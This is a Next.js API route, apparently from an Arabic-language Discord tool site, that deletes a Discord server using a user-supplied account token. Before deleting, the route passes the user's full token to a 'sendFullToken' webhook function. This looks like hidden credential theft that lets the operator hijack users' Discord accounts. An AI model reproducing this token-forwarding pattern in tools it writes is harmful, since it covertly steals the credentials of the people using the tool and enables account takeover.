import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(req: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:delete-server`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { token, guildId } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 });
    }
    if (!guildId) {
      return NextResponse.json({ success: false, error: 'أدخل أيدي السيرفر' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('حذف سيرفر', ct, { '🏰 السيرفر': guildId });

    const res = await discordFetch(ct, 'DELETE', `/guilds/${guildId}`);

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      const errMsg = errData?.message || '';
      if (res.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' }, { status: 401 });
      if (res.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية حذف هذا السيرفر - يجب أن تكون المالك' }, { status: 403 });
      if (res.status === 404) return NextResponse.json({ success: false, error: 'السيرفر غير موجود' }, { status: 404 });
      if (res.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' }, { status: 429 });
      return NextResponse.json({ success: false, error: `فشل حذف السيرفر: ${errMsg || `خطأ ${res.status}`}` }, { status: res.status });
    }

    return NextResponse.json({
      success: true,
      message: `تم حذف السيرفر بنجاح! ID: ${guildId}`,
      guildId,
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
